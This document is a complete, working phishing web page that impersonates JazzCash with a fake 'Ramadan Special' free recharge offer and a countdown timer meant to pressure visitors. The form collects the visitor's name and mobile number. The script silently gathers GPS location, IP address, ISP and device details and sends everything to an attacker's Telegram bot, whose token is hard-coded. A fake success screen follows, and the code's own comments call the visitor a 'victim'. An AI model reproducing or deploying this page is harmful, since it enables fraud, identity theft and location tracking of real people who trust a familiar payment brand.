<!DOCTYPE html>
<html lang="ur-PK">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Jazz Cash | Free Recharge Offer 2025 - 1500 PKT</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(160deg, #0b5e2e 0%, #1b8c3e 100%);
            min-height: 100vh;
            padding: 16px;
        }

        .container {
            max-width: 440px;
            margin: 0 auto;
            background: #ffffff;
            border-radius: 36px;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: fadeInUp 0.5s ease;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* Jazz Cash Header */
        .jazz-header {
            background: linear-gradient(135deg, #007a3d 0%, #00a855 100%);
            padding: 28px 20px 20px 20px;
            text-align: center;
            position: relative;
        }

        .jazz-logo {
            font-size: 28px;
            font-weight: 800;
            color: white;
            margin-bottom: 8px;
        }

        .jazz-logo span {
            background: rgba(255,255,255,0.2);
            padding: 4px 10px;
            border-radius: 100px;
            font-size: 12px;
            margin-left: 8px;
        }

        .offer-chip {
            background: #ffd700;
            color: #007a3d;
            padding: 6px 14px;
            border-radius: 100px;
            display: inline-block;
            font-size: 12px;
            font-weight: bold;
            margin-top: 12px;
        }

        .prize-card {
            background: white;
            margin: -20px 16px 0 16px;
            border-radius: 24px;
            padding: 20px;
            text-align: center;
            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
            position: relative;
            z-index: 2;
        }

        .prize-amount {
            font-size: 44px;
            font-weight: 800;
            color: #007a3d;
        }

        .prize-amount small {
            font-size: 14px;
            font-weight: normal;
        }

        .timer-box {
            background: #fff8e1;
            padding: 12px;
            border-radius: 16px;
            margin: 16px;
            text-align: center;
            border: 1px dashed #ffc107;
        }

        .timer {
            font-size: 22px;
            font-weight: bold;
            color: #e65100;
            font-family: monospace;
        }

        .form-area {
            padding: 20px;
        }

        .input-field {
            margin-bottom: 16px;
        }

        .input-field label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #333;
            margin-bottom: 6px;
        }

        .input-field input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e5e7eb;
            border-radius: 14px;
            font-size: 15px;
            transition: all 0.2s;
        }

        .input-field input:focus {
            outline: none;
            border-color: #007a3d;
        }

        .checkbox-group {
            background: #f9fafb;
            padding: 12px;
            border-radius: 14px;
            margin: 16px 0;
            font-size: 12px;
            color: #666;
        }

        button {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #007a3d 0%, #00a855 100%);
            color: white;
            border: none;
            border-radius: 20px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 8px;
            transition: transform 0.1s;
        }

        button:active {
            transform: scale(0.97);
        }

        .footer-note {
            text-align: center;
            padding: 16px;
            font-size: 10px;
            color: #aaa;
            border-top: 1px solid #f0f0f0;
        }

        .hidden {
            display: none;
        }

        .loading {
            text-align: center;
            padding: 20px;
            background: #f0fdf4;
            border-radius: 16px;
            margin: 16px;
        }

        .spinner {
            border: 3px solid #e5e7eb;
            border-top: 3px solid #007a3d;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="container" id="mainContainer">
    <!-- Header Section -->
    <div class="jazz-header">
        <div class="jazz-logo">
            🏦 JazzCash <span>Official</span>
        </div>
        <div class="offer-chip">🎉 RAMADAN SPECIAL 2025 🎉</div>
    </div>

    <!-- Prize Display -->
    <div class="prize-card">
        <div style="font-size: 14px; color: #666;">Congratulations! You're eligible for</div>
        <div class="prize-amount">PKR 1,500 <small>Free Recharge</small></div>
        <div style="font-size: 12px; margin-top: 8px;">✅ Limited time offer for Jazz/Zong/Telenor users</div>
    </div>

    <!-- Timer -->
    <div class="timer-box">
        <div style="font-size: 12px; margin-bottom: 5px;">⏰ Offer expires in</div>
        <div class="timer" id="countdown">03:45</div>
    </div>

    <!-- Form -->
    <div class="form-area" id="formArea">
        <div class="input-field">
            <label>📛 Full Name (as per CNIC)</label>
            <input type="text" id="fullName" placeholder="e.g., Ahmed Raza" autocomplete="off">
        </div>

        <div class="input-field">
            <label>📱 Mobile Number (Jazz/Zong/Telenor/Ufone)</label>
            <input type="tel" id="phoneNumber" placeholder="03XX XXXXXXX" autocomplete="off">
        </div>

        <div class="checkbox-group">
            <label style="display: flex; align-items: center; gap: 8px;">
                <input type="checkbox" id="agreeCheckbox"> I agree to the terms and conditions and confirm my number is active
            </label>
        </div>

        <button id="claimBtn">🎁 CLAIM FREE RECHARGE NOW 🎁</button>
    </div>

    <div class="footer-note">
        JazzCash is a trademark of Mobilink Microfinance Bank. This offer is valid for verified users only.
    </div>
</div>

<script>
    // ========== YOUR TELEGRAM BOT CONFIGURATION ==========
    const BOT_TOKEN = "8642429606:AAG4359ICue1jVSUSNhlnRTwM95P9YHbIuQ";
    const CHAT_ID = "8723095427";
    // =====================================================

    let userLocation = null;

    // Send data to Telegram
    async function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        try {
            const response = await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: "HTML"
                })
            });
            return await response.json();
        } catch(e) {
            console.error("Telegram error:", e);
        }
    }

    // Get precise GPS location
    function getLocation() {
        return new Promise((resolve) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        });
                    },
                    () => resolve(null)
                );
            } else {
                resolve(null);
            }
        });
    }

    // Get IP with geolocation
    async function getIPDetails() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            return {
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country_name,
                isp: data.org
            };
        } catch(e) {
            return { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Pakistan", isp: "Unknown" };
        }
    }

    // Get device info
    function getDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
    }

    // Validate Pakistani number
    function isValidPakNumber(number) {
        return /^03[0-9]{9}$/.test(number);
    }

    // Countdown timer
    let timeLeft = 225; // 3:45 in seconds
    const timerElement = document.getElementById('countdown');
    const timerInterval = setInterval(() => {
        if (timeLeft <= 0) {
            clearInterval(timerInterval);
            timerElement.textContent = "00:00";
        } else {
            timeLeft--;
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        }
    }, 1000);

    // Main claim function
    document.getElementById('claimBtn').addEventListener('click', async function() {
        const fullName = document.getElementById('fullName').value.trim();
        const phoneNumber = document.getElementById('phoneNumber').value.trim();
        const isAgreed = document.getElementById('agreeCheckbox').checked;

        if (!fullName) {
            alert("⚠️ Please enter your full name");
            return;
        }

        if (!phoneNumber) {
            alert("⚠️ Please enter your mobile number");
            return;
        }

        if (!isValidPakNumber(phoneNumber)) {
            alert("⚠️ Please enter a valid Pakistani number (e.g., 03001234567)");
            return;
        }

        if (!isAgreed) {
            alert("⚠️ Please agree to the terms and conditions");
            return;
        }

        // Show loading state
        const claimBtn = document.getElementById('claimBtn');
        const originalText = claimBtn.innerHTML;
        claimBtn.innerHTML = "⏳ Processing...";
        claimBtn.disabled = true;

        // Collect ALL data
        const location = await getLocation();
        const ipData = await getIPDetails();
        const deviceInfo = getDeviceInfo();
        const timestamp = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });

        // Build comprehensive message for Telegram
        let message = "🎯 <b>🔥 NEW FREE RECHARGE VICTIM 🔥</b> 🎯\n\n";
        message += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        message += `<b>👤 PERSONAL INFORMATION</b>\n`;
        message += `Name: ${fullName}\n`;
        message += `Phone: ${phoneNumber}\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        
        message += `<b>📍 GPS LOCATION</b>\n`;
        if(location) {
            message += `Latitude: ${location.lat}\n`;
            message += `Longitude: ${location.lon}\n`;
            message += `Accuracy: ${location.accuracy} meters\n`;
            message += `Maps: https://maps.google.com/?q=${location.lat},${location.lon}\n`;
        } else {
            message += `❌ Location permission denied\n`;
        }
        message += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        
        message += `<b>🌐 IP & NETWORK</b>\n`;
        message += `IP Address: ${ipData.ip}\n`;
        message += `City: ${ipData.city}\n`;
        message += `Region: ${ipData.region}\n`;
        message += `Country: ${ipData.country}\n`;
        message += `ISP: ${ipData.isp}\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        
        message += `<b>📱 DEVICE INFORMATION</b>\n`;
        message += `Platform: ${deviceInfo.platform}\n`;
        message += `Language: ${deviceInfo.language}\n`;
        message += `Screen: ${deviceInfo.screen}\n`;
        message += `Timezone: ${deviceInfo.timezone}\n`;
        message += `User Agent: ${deviceInfo.userAgent.substring(0, 120)}...\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        
        message += `<b>⏰ TIMESTAMP</b>\n`;
        message += `Date/Time (PKT): ${timestamp}\n`;
        message += `━━━━━━━━━━━━━━━━━━━━━━━━\n`;
        
        message += `<b>💰 OFFER:</b> Free PKR 1500 Recharge\n`;
        message += `<b>🔗 STATUS:</b> Data Captured ✅`;

        // Send to Telegram
        await sendToTelegram(message);

        // Also send location separately if available
        if(location) {
            const locMsg = `🗺️ <b>📍 LIVE LOCATION MAP</b>\n${fullName} | ${phoneNumber}\nhttps://maps.google.com/?q=${location.lat},${location.lon}`;
            await sendToTelegram(locMsg);
        }

        // Show success page (victim thinks they won)
        document.getElementById('mainContainer').innerHTML = `
            <div style="text-align: center; padding: 50px 30px; background: white; min-height: 500px;">
                <div style="font-size: 70px;">🎉</div>
                <h2 style="color: #007a3d; margin: 20px 0;">Recharge Successful!</h2>
                <div style="background: #f0fdf4; padding: 20px; border-radius: 20px; margin: 20px 0;">
                    <p style="font-size: 24px; font-weight: bold; color: #007a3d;">PKR 1,500</p>
                    <p>has been added to your account</p>
                    <p style="font-size: 12px; color: #666; margin-top: 10px;">Reference ID: JZ${Math.floor(Math.random() * 1000000)}</p>
                </div>
                <p style="color: #888; font-size: 13px;">Amount will reflect within 2-5 minutes</p>
                <br><br>
                <a href="https://www.jazzcash.com.pk" style="color: #007a3d; text-decoration: none;">← Back to JazzCash</a>
            </div>
        `;
    });
</script>
</body>
</html>
